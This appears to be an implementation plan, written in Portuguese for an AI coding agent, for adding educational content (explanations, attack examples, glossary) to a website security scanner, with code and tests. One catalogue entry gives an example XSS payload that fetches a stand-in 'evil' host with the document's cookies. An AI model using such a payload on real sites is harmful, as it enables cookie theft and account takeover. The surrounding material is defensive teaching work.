# Sprint 8A — Modo Educativo (Conteúdo): Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:executing-plans. Steps usam checkbox (`- [ ]`).

**Goal:** Adicionar conteúdo educativo por achado (explicação simples/técnica, exemplo de ataque, referências) + glossário, expostos por API, no Plano de Ação (modo iniciante/avançado) e num apêndice do relatório.

**Architecture:** Catálogo educativo estático por `refId` (puro, testável) alimenta um endpoint, o frontend (expansível no Plano de Ação + glossário) e um apêndice "Aprenda mais" no relatório HTML/MD.

**Tech Stack:** TypeScript (CommonJS), Express, Vitest, React/Vite.

## Global Constraints

- Linguagem: pt-BR. Resposta API `{ sucesso, dados }`. Rotas sob `/api/v1`, protegidas (exceto as já públicas).
- Conteúdo educativo é **dado estático versionado** (não banco). Exemplos de ataque são texto ilustrativo.
- Cobertura obrigatória: um `ConteudoEducativo` para cada `refId` exportado pelo `vulnerabilidades.catalog`.
- Modo iniciante/avançado é client-side (`localStorage` `wsa:modoEducativo`, default `"iniciante"`).
- Testes co-localizados; rodar de `backend/`. Após cada tarefa: suíte verde + commit.

---

### Task 1: educativo.catalog (TDD)

**Files:**
- Create: `backend/src/services/educativo.catalog.ts`
- Test: `backend/src/services/educativo.catalog.test.ts`
- Lê: `backend/src/services/vulnerabilidades.catalog.ts` (para a lista de refIds)

**Interfaces:**
- Produces:
  - `interface ReferenciaEducativa { titulo: string; url: string }`
  - `interface ConteudoEducativo { refId: string; explicacaoSimples: string; explicacaoTecnica: string; exemploAtaque: string; referencias: ReferenciaEducativa[] }`
  - `interface TermoGlossario { termo: string; definicao: string }`
  - `obterConteudoEducativo(refId: string): ConteudoEducativo | null`
  - `listarConteudos(): ConteudoEducativo[]`
  - `listarGlossario(): TermoGlossario[]`
  - `REFIDS_CONHECIDOS: string[]` exportado do `vulnerabilidades.catalog` (ver Step 0).

- [ ] **Step 0: Expor os refIds do catálogo** — `backend/src/services/vulnerabilidades.catalog.ts`

Adicionar ao final do arquivo um export com as chaves do catálogo:

```ts
export const REFIDS_CONHECIDOS = Object.keys(CATALOGO);
```

(`CATALOGO` é o objeto interno existente com as 19 entradas.)

- [ ] **Step 1: Teste que falha** (`educativo.catalog.test.ts`)

```ts
import { describe, it, expect } from "vitest";
import { obterConteudoEducativo, listarConteudos, listarGlossario } from "./educativo.catalog";
import { REFIDS_CONHECIDOS } from "./vulnerabilidades.catalog";

describe("educativo.catalog", () => {
  it("tem conteúdo para todos os refIds do catálogo de vulnerabilidades", () => {
    for (const refId of REFIDS_CONHECIDOS) {
      expect(obterConteudoEducativo(refId), `faltou conteúdo para ${refId}`).not.toBeNull();
    }
  });

  it("cada conteúdo tem explicações não vazias e ao menos uma referência http", () => {
    for (const c of listarConteudos()) {
      expect(c.explicacaoSimples.length).toBeGreaterThan(0);
      expect(c.explicacaoTecnica.length).toBeGreaterThan(0);
      expect(c.exemploAtaque.length).toBeGreaterThan(0);
      expect(c.referencias.length).toBeGreaterThanOrEqual(1);
      expect(c.referencias.every((r) => /^https?:\/\//.test(r.url))).toBe(true);
    }
  });

  it("refId desconhecido retorna null", () => {
    expect(obterConteudoEducativo("nao-existe")).toBeNull();
  });

  it("glossário não é vazio e os termos têm definição", () => {
    const g = listarGlossario();
    expect(g.length).toBeGreaterThanOrEqual(10);
    expect(g.every((t) => t.termo.length > 0 && t.definicao.length > 0)).toBe(true);
  });
});
```

- [ ] **Step 2: Rodar e ver falhar**

Run: `cd backend && npx vitest run src/services/educativo.catalog.test.ts`
Expected: FAIL — módulo inexistente.

- [ ] **Step 3: Implementar `educativo.catalog.ts`**

Estrutura + **todas as 19 entradas** (uma por refId de `REFIDS_CONHECIDOS`) e o
glossário (≥10 termos). Conteúdo é dado — preencher com texto real em pt-BR.
Padrão de cada entrada (exemplo real para dois refIds; replicar para os demais):

```ts
export interface ReferenciaEducativa { titulo: string; url: string }
export interface ConteudoEducativo {
  refId: string;
  explicacaoSimples: string;
  explicacaoTecnica: string;
  exemploAtaque: string;
  referencias: ReferenciaEducativa[];
}
export interface TermoGlossario { termo: string; definicao: string }

const CONTEUDO: Record<string, ConteudoEducativo> = {
  "header-csp-ausente": {
    refId: "header-csp-ausente",
    explicacaoSimples:
      "O site não diz ao navegador de onde pode carregar scripts e conteúdo. Isso facilita que um atacante injete código malicioso na página.",
    explicacaoTecnica:
      "Sem Content-Security-Policy, o navegador executa scripts inline e de qualquer origem. Uma CSP restritiva (ex.: default-src 'self') reduz a superfície de XSS ao bloquear fontes não autorizadas e inline scripts.",
    exemploAtaque:
      "Um comentário malicioso contendo <script>fetch('https://evil/?c='+document.cookie)</script> seria executado e enviaria os cookies da vítima ao atacante.",
    referencias: [
      { titulo: "OWASP — Content Security Policy", url: "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html" },
      { titulo: "MDN — Content-Security-Policy", url: "https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers/Content-Security-Policy" },
    ],
  },
  "https-ausente": {
    refId: "https-ausente",
    explicacaoSimples:
      "O site não usa conexão segura (HTTPS). Tudo que você digita pode ser lido por quem estiver na mesma rede.",
    explicacaoTecnica:
      "Sem TLS, o tráfego trafega em texto puro e é suscetível a interceptação e adulteração (man-in-the-middle). HTTPS garante confidencialidade, integridade e autenticidade do canal.",
    exemploAtaque:
      "Em uma rede Wi-Fi pública, um atacante captura o formulário de login enviado por HTTP e lê usuário e senha em claro.",
    referencias: [
      { titulo: "OWASP — Transport Layer Protection", url: "https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html" },
      { titulo: "MDN — HTTPS", url: "https://developer.mozilla.org/pt-BR/docs/Glossary/HTTPS" },
    ],
  },
  // ... DEMAIS 17 refIds, mesmo formato:
  // tls-nao-confiavel, cert-expirado, cert-expirando,
  // header-hsts-ausente, header-xframe-ausente, header-xcto-ausente,
  // header-referrer-ausente, header-permissions-ausente,
  // cookie-sem-secure, cookie-sem-httponly, cookie-sem-samesite,
  // exposicao-server, exposicao-xpoweredby, exposicao-comentarios,
  // perf-tempo-elevado, perf-sem-compressao, perf-sem-cache
};

const GLOSSARIO: TermoGlossario[] = [
  { termo: "XSS (Cross-Site Scripting)", definicao: "Injeção de scripts maliciosos numa página, executados no navegador da vítima." },
  { termo: "CSRF (Cross-Site Request Forgery)", definicao: "Ataque que faz o navegador da vítima enviar requisições autenticadas sem o consentimento dela." },
  { termo: "Clickjacking", definicao: "Enganar o usuário a clicar em algo invisível, sobrepondo o site em um iframe." },
  { termo: "MIME sniffing", definicao: "Quando o navegador adivinha o tipo de um recurso, podendo executar conteúdo perigoso." },
  { termo: "CSP (Content-Security-Policy)", definicao: "Cabeçalho que restringe de onde a página pode carregar recursos." },
  { termo: "HSTS", definicao: "Cabeçalho que força o navegador a usar sempre HTTPS naquele domínio." },
  { termo: "CORS", definicao: "Mecanismo que controla quais origens podem acessar um recurso via navegador." },
  { termo: "TLS/SSL", definicao: "Protocolos que cifram a conexão entre cliente e servidor (a base do HTTPS)." },
  { termo: "SPF", definicao: "Registro DNS que lista quais servidores podem enviar e-mail por um domínio." },
  { termo: "DKIM", definicao: "Assinatura criptográfica que comprova a integridade e a origem de um e-mail." },
  { termo: "DMARC", definicao: "Política que define o que fazer com e-mails que falham SPF/DKIM." },
  { termo: "MITM (Man-in-the-Middle)", definicao: "Atacante que se posiciona entre as partes para ler ou alterar o tráfego." },
];

export function obterConteudoEducativo(refId: string): ConteudoEducativo | null {
  return CONTEUDO[refId] ?? null;
}
export function listarConteudos(): ConteudoEducativo[] {
  return Object.values(CONTEUDO);
}
export function listarGlossario(): TermoGlossario[] {
  return GLOSSARIO;
}
```

**Nota:** preencher as 17 entradas restantes com texto real seguindo o padrão
acima (explicação simples e técnica, exemplo de ataque textual, ≥1 referência
com URL http). O teste do Step 1 garante a cobertura de todos os refIds.

- [ ] **Step 4: Rodar e ver passar**

Run: `cd backend && npx vitest run src/services/educativo.catalog.test.ts`
Expected: PASS (4 testes).

- [ ] **Step 5: Commit**

```bash
git add backend/src/services/educativo.catalog.ts backend/src/services/educativo.catalog.test.ts backend/src/services/vulnerabilidades.catalog.ts
git commit -m "test(educativo): catálogo educativo e glossário via TDD"
```

---

### Task 2: educativo.report (TDD) + apêndice no relatório

**Files:**
- Create: `backend/src/reports/educativo.report.ts`
- Test: `backend/src/reports/educativo.report.test.ts`
- Modify: `backend/src/reports/html.report.ts`
- Modify: `backend/src/reports/markdown.report.ts`

**Interfaces:**
- Consumes: `obterConteudoEducativo`.
- Produces:
  - `gerarApendiceEducativoMd(refIds: string[]): string`
  - `gerarApendiceEducativoHtml(refIds: string[]): string`

- [ ] **Step 1: Teste que falha** (`educativo.report.test.ts`)

```ts
import { describe, it, expect } from "vitest";
import { gerarApendiceEducativoMd, gerarApendiceEducativoHtml } from "./educativo.report";

describe("apêndice educativo", () => {
  it("markdown traz explicação simples e ao menos uma referência", () => {
    const md = gerarApendiceEducativoMd(["header-csp-ausente"]);
    expect(md).toContain("## Aprenda mais");
    expect(md).toContain("Content-Security-Policy") ;
    expect(md).toMatch(/https?:\/\//);
  });
  it("refIds duplicados aparecem uma vez", () => {
    const md = gerarApendiceEducativoMd(["https-ausente", "https-ausente"]);
    expect(md.match(/### /g)?.length).toBe(1);
  });
  it("lista vazia mostra estado neutro", () => {
    expect(gerarApendiceEducativoMd([])).toContain("Nenhum achado");
  });
  it("html tem a âncora da seção", () => {
    const html = gerarApendiceEducativoHtml(["https-ausente"]);
    expect(html).toContain('id="aprenda-mais"');
  });
});
```

- [ ] **Step 2: Rodar e ver falhar**

Run: `cd backend && npx vitest run src/reports/educativo.report.test.ts`
Expected: FAIL — módulo inexistente.

- [ ] **Step 3: Implementar `educativo.report.ts`**

```ts
import { obterConteudoEducativo } from "../services/educativo.catalog";

function esc(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function unicos(refIds: string[]): string[] {
  return [...new Set(refIds)];
}

export function gerarApendiceEducativoMd(refIds: string[]): string {
  const itens = unicos(refIds)
    .map((id) => obterConteudoEducativo(id))
    .filter((c): c is NonNullable<typeof c> => c !== null);
  if (itens.length === 0) return `## Aprenda mais\n\nNenhum achado para detalhar.`;
  const blocos = itens
    .map(
      (c) =>
        `### ${c.refId}\n\n${c.explicacaoSimples}\n\n${c.referencias.map((r) => `- [${r.titulo}](${r.url})`).join("\n")}`,
    )
    .join("\n\n");
  return `## Aprenda mais\n\n${blocos}`;
}

export function gerarApendiceEducativoHtml(refIds: string[]): string {
  const itens = unicos(refIds)
    .map((id) => obterConteudoEducativo(id))
    .filter((c): c is NonNullable<typeof c> => c !== null);
  const corpo =
    itens.length === 0
      ? "<p>Nenhum achado para detalhar.</p>"
      : itens
          .map(
            (c) =>
              `<h3>${esc(c.refId)}</h3><p>${esc(c.explicacaoSimples)}</p><ul>${c.referencias
                .map((r) => `<li><a href="${esc(r.url)}">${esc(r.titulo)}</a></li>`)
                .join("")}</ul>`,
          )
          .join("");
  return `<section id="aprenda-mais" class="secao"><h2>Aprenda mais</h2>${corpo}</section>`;
}
```

- [ ] **Step 4: Rodar e ver passar**

Run: `cd backend && npx vitest run src/reports/educativo.report.test.ts`
Expected: PASS (4 testes).

- [ ] **Step 5: Integrar no Markdown** — `backend/src/reports/markdown.report.ts`

Importar `import { gerarApendiceEducativoMd } from "./educativo.report";` e, onde o
`conformidadeMd` é montado, adicionar `const aprendaMaisMd = gerarApendiceEducativoMd(scoreFinal.vulnerabilidades.map((v) => v.refId));` e inserir `${aprendaMaisMd}` logo após `${conformidadeMd}` no template.

- [ ] **Step 6: Integrar no HTML** — `backend/src/reports/html.report.ts`

Importar `import { gerarApendiceEducativoHtml } from "./educativo.report";`. Adicionar item no `<nav>` após "Conformidade": `<li><a href="#aprenda-mais">9. Aprenda mais</a></li>` e renumerar Assinatura para 10 (no nav e no `<h2>`). Inserir antes da seção `id="assinatura"`:
`${gerarApendiceEducativoHtml(d.vulnerabilidades.map((v) => v.refId))}`.

- [ ] **Step 7: Verificar + commit**

Run: `cd backend && npx tsc --noEmit && npm test`
Expected: tsc ok; testes passam (ajustar o teste de índice do html.report se ele checa a numeração/ids — incluir `"aprenda-mais"` na lista de ids esperados, se aplicável).
```bash
git add backend/src/reports
git commit -m "feat(educativo): apêndice Aprenda mais no relatório HTML/MD"
```

---

### Task 3: API /educativo + OpenAPI + Postman

**Files:**
- Create: `backend/src/controllers/educativo.controller.ts`
- Create: `backend/src/routes/educativo.routes.ts`
- Modify: `backend/src/routes/index.ts`, `backend/src/docs/openapi.ts`
- Modify: `docs/postman/colecao.json` (regenerado)

- [ ] **Step 1: `educativo.controller.ts`**

```ts
import type { Request, Response } from "express";
import { listarConteudos, listarGlossario } from "../services/educativo.catalog";

export async function obterEducativo(_req: Request, res: Response) {
  const conteudos: Record<string, ReturnType<typeof listarConteudos>[number]> = {};
  for (const c of listarConteudos()) conteudos[c.refId] = c;
  res.json({ sucesso: true, dados: { conteudos, glossario: listarGlossario() } });
}
```

- [ ] **Step 2: `educativo.routes.ts`**

```ts
import { Router } from "express";
import { asyncHandler } from "../middlewares/asyncHandler";
import { obterEducativo } from "../controllers/educativo.controller";

export const educativoRouter = Router();
educativoRouter.get("/", asyncHandler(obterEducativo));
```

- [ ] **Step 3: Registrar (protegido)** — `backend/src/routes/index.ts`:
`import { educativoRouter } from "./educativo.routes";` e `router.use("/educativo", autenticar, educativoRouter);`.

- [ ] **Step 4: OpenAPI** — em `backend/src/docs/openapi.ts`, no `paths`:

```ts
    "/educativo": {
      get: { summary: "Conteúdo educativo (por achado) e glossário", responses: { "200": { description: "Conteúdos e glossário" } } },
    },
```

- [ ] **Step 5: Regenerar Postman + verificar + commit**

Run: `cd backend && npm run postman:gen && npx tsc --noEmit && npm test`
Expected: snapshot atualizado; tsc ok; testes passam.
```bash
git add backend/src docs/postman/colecao.json
git commit -m "feat(api): endpoint de conteúdo educativo"
```

---

### Task 4: Frontend — modo educativo no Plano de Ação + glossário

**Files:**
- Modify: `frontend/src/types/index.ts`
- Modify: `frontend/src/services/api.ts`
- Create: `frontend/src/components/GlossarioCard.tsx`
- Modify: `frontend/src/components/PlanoDeAcao.tsx`
- Modify: `frontend/src/pages/VisualizadorRelatorio.tsx`

**Interfaces:**
- Consumes: `GET /educativo`.
- Produces: `ConteudoEducativo`, `TermoGlossario`, `Educativo`, `buscarEducativo`.

- [ ] **Step 1: Tipos** — `frontend/src/types/index.ts` (ao final)

```ts
export interface ReferenciaEducativa { titulo: string; url: string }
export interface ConteudoEducativo {
  refId: string;
  explicacaoSimples: string;
  explicacaoTecnica: string;
  exemploAtaque: string;
  referencias: ReferenciaEducativa[];
}
export interface TermoGlossario { termo: string; definicao: string }
export interface Educativo {
  conteudos: Record<string, ConteudoEducativo>;
  glossario: TermoGlossario[];
}
```

- [ ] **Step 2: API** — `frontend/src/services/api.ts` (adicionar; juntar `Educativo` ao import de tipos)

```ts
export async function buscarEducativo(): Promise<Educativo> {
  const { data } = await api.get("/educativo");
  return data.dados;
}
```

- [ ] **Step 3: `GlossarioCard.tsx`**

```tsx
import type { TermoGlossario } from "../types";
import { Card } from "./Card";

export function GlossarioCard({ glossario }: { glossario: TermoGlossario[] }) {
  if (glossario.length === 0) return null;
  return (
    <Card title="Glossário de Segurança">
      <dl className="space-y-2">
        {glossario.map((t) => (
          <div key={t.termo}>
            <dt className="text-sm text-slate-200">{t.termo}</dt>
            <dd className="text-xs text-slate-400">{t.definicao}</dd>
          </div>
        ))}
      </dl>
    </Card>
  );
}
```

- [ ] **Step 4: PlanoDeAcao — modo educativo por achado**

Em `frontend/src/components/PlanoDeAcao.tsx`:
- importar `import { buscarEducativo } from "../services/api";` e tipos `Educativo`.
- adicionar estado:

```tsx
const [educativo, setEducativo] = useState<Educativo | null>(null);
const [modo, setModo] = useState<"iniciante" | "avancado">(() =>
  (localStorage.getItem("wsa:modoEducativo") as "iniciante" | "avancado") || "iniciante",
);
useEffect(() => { buscarEducativo().then(setEducativo).catch(() => setEducativo(null)); }, []);
useEffect(() => { localStorage.setItem("wsa:modoEducativo", modo); }, [modo]);
```

- no cabeçalho do componente (ou do card de lista), um seletor de modo:

```tsx
<div className="flex items-center gap-2 text-xs">
  <span className="text-slate-500">Modo:</span>
  <button onClick={() => setModo("iniciante")} className={modo === "iniciante" ? "text-accent" : "text-slate-400"}>Iniciante</button>
  <button onClick={() => setModo("avancado")} className={modo === "avancado" ? "text-accent" : "text-slate-400"}>Avançado</button>
</div>
```

- dentro do bloco de detalhes de cada `VulnLinha` (onde já há descrição/recomendação),
  acrescentar, quando `educativo?.conteudos[v.refId]` existir, um bloco "Modo educativo":

```tsx
{educativo?.conteudos[v.refId] && (
  <div className="mt-2 rounded-md border border-line/60 bg-bg-raised/30 p-2 text-xs">
    <p className="text-slate-300">
      {modo === "iniciante"
        ? educativo.conteudos[v.refId].explicacaoSimples
        : educativo.conteudos[v.refId].explicacaoTecnica}
    </p>
    <p className="mt-1 text-slate-500"><span className="text-slate-400">Exemplo de ataque:</span> {educativo.conteudos[v.refId].exemploAtaque}</p>
    <div className="mt-1 flex flex-wrap gap-2">
      {educativo.conteudos[v.refId].referencias.map((r) => (
        <a key={r.url} href={r.url} target="_blank" rel="noreferrer" className="text-accent hover:underline">{r.titulo}</a>
      ))}
    </div>
  </div>
)}
```

(Passar `educativo` e `modo` para `VulnLinha` via props, ou mover o estado para
dentro do componente que renderiza as linhas — manter coeso com o componente.)

- [ ] **Step 5: Glossário no visualizador** — `frontend/src/pages/VisualizadorRelatorio.tsx`

Importar `GlossarioCard` e `buscarEducativo`; carregar o glossário num estado e
renderizar `<GlossarioCard glossario={...} />` após o `ChecklistConformidade`
(quando houver glossário). Pode reusar uma chamada a `buscarEducativo()`.

- [ ] **Step 6: Build**

Run: `cd frontend && npx tsc --noEmit && npm run build`
Expected: sem erros.

- [ ] **Step 7: Commit**

```bash
git add frontend/src
git commit -m "feat(educativo): modo educativo no plano de ação e glossário"
```

---

### Task 5: Verificação final

- [ ] `cd backend && npm test` → todos verdes.
- [ ] `cd backend && npx tsc --noEmit` → sem erros.
- [ ] `cd frontend && npm run build` → sucesso.
- [ ] Commit final se necessário.

## Self-Review

**1. Spec coverage:**
- Catálogo educativo por refId + glossário → Task 1. ✓
- Explicação simples/técnica, exemplo de ataque, referências → Task 1 (conteúdo). ✓
- API `/educativo` → Task 3. ✓
- Modo iniciante/avançado + integração no Plano de Ação → Task 4. ✓
- Glossário na UI → Task 4. ✓
- Apêndice no relatório (HTML/MD) → Task 2. ✓
- Cobertura de todos os refIds → Task 1 (teste). ✓
- YAGNI (quiz/progresso/demos) → sem tarefa (8B). ✓

**2. Placeholder scan:** o catálogo educativo (Task 1 Step 3) é **dado**: mostra a
estrutura + 2 entradas reais + o glossário completo, com instrução de preencher
as 17 restantes seguindo o padrão; a cobertura é garantida pelo teste. Não há
placeholders em passos de lógica.

**3. Type consistency:** `ConteudoEducativo`/`ReferenciaEducativa`/`TermoGlossario`
(Task 1) reusados no controller (Task 3) e no frontend (Task 4). `obterConteudoEducativo`
usado em Task 2 e Task 3. `gerarApendiceEducativoMd/Html(refIds)` (Task 2) chamados
pelos relatórios com `vulnerabilidades.map((v) => v.refId)`. Endpoint `/educativo`
protegido e documentado.
